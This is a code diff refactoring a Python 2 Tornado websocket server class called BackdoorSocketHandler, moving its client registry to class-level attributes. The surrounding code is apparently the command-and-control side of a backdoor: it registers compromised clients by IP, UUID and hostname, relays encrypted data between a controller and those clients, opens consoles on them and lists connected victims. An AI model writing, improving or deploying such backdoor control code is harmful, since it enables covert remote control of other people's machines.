@@ -21,7 +21,7 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
         pass
 
     def send_to_all(self, message):
-        for key, c in self.clients:
+        for key, c in BackdoorSocketHandler.clients:
             c.write_message(json.dumps(message))
 
     def __init__(self, app, request, **kwargs):
@@ -49,8 +49,8 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
         pass
 
     def on_close(self):
-        if self.ID in self.clients:
-            self.clients.pop(self.ID)
+        if self.ID in BackdoorSocketHandler.clients:
+            BackdoorSocketHandler.clients.pop(self.ID)
 
     def send_data(self, data):
         self.write_message(self.encrypt(json.dumps({'data': b64encode(data)})), True)
@@ -75,14 +75,14 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
             elif not self.is_controller and 'to' in msg:
                 to = msg['to']
                 if 'connected' in msg and to is not None:
-                    if to in self.clients:
-                        to_controler = self.clients[to]
+                    if to in BackdoorSocketHandler.clients:
+                        to_controler = BackdoorSocketHandler.clients[to]
                         to_controler.to_client_id = self.ID
                         to_controler.send_json({'connected': self.ID})
 
                 elif ('data' in msg or 'char' in msg or 'end' in msg) and to is not None:
-                    if to in self.clients:
-                        to_controler = self.clients[to]
+                    if to in BackdoorSocketHandler.clients:
+                        to_controler = BackdoorSocketHandler.clients[to]
                         to_controler.to_client_id = self.ID
                         to_controler.send_json(msg)
 
@@ -104,14 +104,14 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                         self.send_data('login failed')
                         return
 
-                self.ID = self.ID_LASTEST
-                self.clients[self.ID] = self
+                self.ID = BackdoorSocketHandler.ID_LASTEST
+                BackdoorSocketHandler.clients[self.ID] = self
                 print 'find new client: ' + str(self.ID) + ' -- ' + self.request.remote_ip + '(' + self.UUID + ')'
                 BackdoorSocketHandler.ID_LASTEST += 1
 
     def control_to_client(self, json_obj):
-        if self.to_client_id in self.clients:
-            to = self.clients[self.to_client_id]
+        if self.to_client_id in BackdoorSocketHandler.clients:
+            to = BackdoorSocketHandler.clients[self.to_client_id]
             to.send_json(json_obj)
         else:
             self.to_client_id = None
@@ -159,8 +159,8 @@ Options:
                     return
 
                 to = int(args['<client_id>'])
-                if to in self.clients:
-                    to_client = self.clients[to]
+                if to in BackdoorSocketHandler.clients:
+                    to_client = BackdoorSocketHandler.clients[to]
                     if not to_client.is_controller:
                         to_client.send_json({'new_consloe': self.ID})
                     else:
@@ -188,7 +188,7 @@ Options:
             # ====================
             elif args['list']:
                 data = ''
-                for key, client in self.clients.items():
+                for key, client in BackdoorSocketHandler.clients.items():
                     data += str(key) + '\t' + client.HOST_NAME + '\t' + \
                             client.request.remote_ip + '\t' + client.UUID + '\n'
 
